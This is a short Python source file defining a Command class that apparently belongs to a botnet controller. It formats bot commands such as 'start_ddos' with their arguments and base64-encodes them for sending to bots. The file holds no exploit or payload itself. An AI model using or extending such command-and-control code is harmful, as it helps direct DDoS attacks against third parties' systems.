'''
Created on Dec 14, 2013

@author: Onur
'''

from BotCommand import BOT_COMMAND
from base64 import b64encode

class Command(object):
    """ Represents a bot command.
        
        Keeps and commands and their arguments.
        Also prepares commands for sending
        
        Attributes:
            cmd: command name ( ex: start_ddos)
            arguments: command arguments            
    """

    cmd = None
    arguments = []

    def __init__(self, cmd, arguments):
        """ Initializes Command class with cmd and arguments"""
        self.cmd = cmd
        self.arguments = list(arguments)
    
    def __str__(self):
        """ Returns command code and arguments in a comma separated form."""
        retStr = BOT_COMMAND[self.cmd]
        for arg in self.arguments:
            retStr = str(retStr) + "," + arg
        
        return retStr
    
    def getEncodedCommand(self):
        """ Returns base64 encoded command (comma separated with arguments) """
        return b64encode(self.__str__())
    